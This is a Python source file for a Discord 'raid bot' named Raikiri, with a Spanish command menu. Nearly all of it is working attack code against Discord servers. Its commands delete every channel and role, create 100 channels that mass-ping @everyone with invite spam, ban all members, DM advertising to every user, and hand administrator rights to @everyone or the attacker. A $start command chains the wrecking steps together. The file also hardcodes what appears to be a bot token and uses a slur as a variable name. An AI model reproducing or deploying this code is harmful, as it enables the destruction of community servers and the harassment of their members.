import time
import asyncio
import discord
import raikiri_data
import raikiri_aesthetic
from discord.utils import get
from discord.ext import commands
from discord_webhook import DiscordWebhook, DiscordEmbed
from keep_alive import keep_alive
keep_alive()
intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix=raikiri_data.login["prefix"], intents=intents)

@client.event
async def on_ready():
    print(raikiri_aesthetic.ready)
    while True:
        for raikiri_status in raikiri_aesthetic.status:
            await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=raikiri_status))
            await asyncio.sleep(60)

@client.event
async def on_guild_channel_create(channel):
    if channel.name != "fucked-by-nation":
        counter = 0
        while counter < 15:
            await channel.send("@everyone Raid by Nation:\nhttps://discord.gg/dqWGRBuEry")
            counter += 1
            await asyncio.sleep(1)

@client.command()
async def delk(ctx):
    await ctx.guild.edit(name="PwnedByNation")
    for guild in client.guilds:
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                print(f"Error, no se ha podido eliminar el canal {channel}")
    await ctx.guild.create_text_channel("fucked-by-nation")

@client.command()
async def spam(ctx):
    counter = 0
    while counter < 100:
        await ctx.guild.create_text_channel("raid-by-nation")
        counter += 1

@client.command()
async def banall(ctx):
    for members in client.get_all_members():
        if members != ctx.message.author:
            try:
                await members.ban()
            except:
                print(f"Error, no se ha podido banear al usuario: {members}")

@client.command()
async def derol(ctx):
    for rols in ctx.guild.roles:
        try:
            await rols.delete()
        except:
            print(f"Error, no se pudo eliminar el rol {rols}")

@client.command()
async def roles(ctx):
    counter = 0
    while counter < 10:
        try:
            await ctx.guild.create_role(name="RaidByNation")
        except:
            print("Error, no se  ha podido crear el rol.")
        counter += 1

@client.command()
async def dm(ctx):
    for users in client.get_all_members():
        if users != ctx.message.author:
            try:
                await users.send("Get in to Nation:\nhttps://discord.gg/dqWGRBuEry")
            except:
                print(f"Error, no se ha podido enviar el mensaje al usuario: {users}")

@client.command()
async def join(ctx):
    user_id = ctx.message.author.id
    if user_id in raikiri_data.bot_users:
        user = ctx.message.author
        await user.send("Aquí tienes mi invitación:\nhttps://discord.com/oauth2/authorize?client_id=824520096328318997&scope=bot&permissions=8")
    else:
        await ctx.send("Error, comando exclusivo para miembros.")

@client.command()
async def menu(ctx):
    user_id = ctx.message.author.id
    if user_id in raikiri_data.bot_users:
        user = ctx.message.author
        embed = discord.Embed(
            title = "Bienvenido al menú de Raikiri",
            description = "Aquí encontraras la función de cada comando y su sintaxis.",
            colour = 0x7d1500
        )
        embed.set_footer(text="Raidbot by: r2pc96")
        embed.add_field(name="$menu", value="Muestra un mensaje embed con los comandos y una descripción de cada uno.", inline=False)
        embed.add_field(name="$spam", value="Crea 100 canales de Spam con 15 pings por canal.", inline=True)
        embed.add_field(name="$roles", value="Hace 250 roles con propaganda gratuita.", inline=False)
        embed.add_field(name="$dm", value="Envía mensajes a cada usuario en el servidor, excepto al autor del comando.", inline=True)
        embed.add_field(name="$banall", value="Banea a todos los usuarios, excluyendo a quien coloque el comando.", inline=False)
        embed.add_field(name="$start", value="Ejecuta todos los comandos de Raid al mismo tiempo, exceptuando el ban all.", inline=True)
        embed.add_field(name="$derol", value="Borra todos los roles del servidor.", inline=False)
        embed.add_field(name="$join", value="Envía la invitación del bot por DM.", inline=True)
        embed.add_field(name="$admin_in", value="Da permisos de administrador al rol @everyone.", inline=False)
        embed.add_field(name="$role_admin_in <ID - Rol>", value="Edita un rol por ID o Nombre para asignarle permisos de administrador.", inline=True)
        embed.add_field(name="$admin", value="Creará un rol con permisos de administrador y se los dará al usuario que coloque el comando.", inline=False)
        embed.add_field(name="$unbanall", value="Desbanea a todos los usuarios de un servidor.")
        embed.set_image(url="https://media.discordapp.net/attachments/824508045185777674/824511282022449172/nationgif.gif")
        await user.send(embed=embed)
    else:
        await ctx.send("Error, comando exclusivo para miembros.")

@client.command()
async def admin(ctx):
    user_id = ctx.message.author.id
    if user_id in raikiri_data.bot_users:
        try:
            user = ctx.message.author
            permissions = discord.Permissions()
            permissions.update(administrator = True)
            role = await ctx.guild.create_role(name="Allah", permissions=permissions, colour=0xffd700)
            await user.add_roles(role)
        except:
            await ctx.send("Error, no se pudo crear el rol")
    else:
        await ctx.send("Error, comando exclusivo para miembros")

@client.command()
async def admin_in(ctx):
    user_id = ctx.message.author.id
    if user_id in raikiri_data.bot_users:
        try:
            perms = discord.Permissions()
            perms.update(administrator=True)
            for rols in ctx.guild.roles:
                if rols.name == "@everyone":
                    await rols.edit(permissions=perms)
        except:
            await ctx.send("Error, no se ha podido editar el rol.")
    else:
        await ctx.send("Error, comando exclusivo para miembros.")

@client.command()
async def role_admin_in(ctx, role: discord.Role, *, reason=None):
    user_id = ctx.message.author.id
    if user_id in raikiri_data.bot_users:
        try:
            perms = discord.Permissions()
            perms.update(administrator=True)
            await role.edit(permissions=perms)
        except:
            await ctx.send("Error, no se pudo editar el rol.")
    else:
        await ctx.send("Error, comando exclusivo para miembros.")

@client.command()
async def unbanall(ctx):
    banned_fags = await ctx.guild.bans()
    for banned in banned_fags:
        await ctx.guild.unban(banned[1])

@client.command()
async def start(ctx):
    await delk(ctx)
    await spam(ctx)
    await derol(ctx)
    await roles(ctx)
    await dm(ctx)

client.run("ODM1Mjg3OTIwNjMzMDUzMjI1.YINQfw.bbYs2BeWSOEmT7chg1NNhjJfaL4")
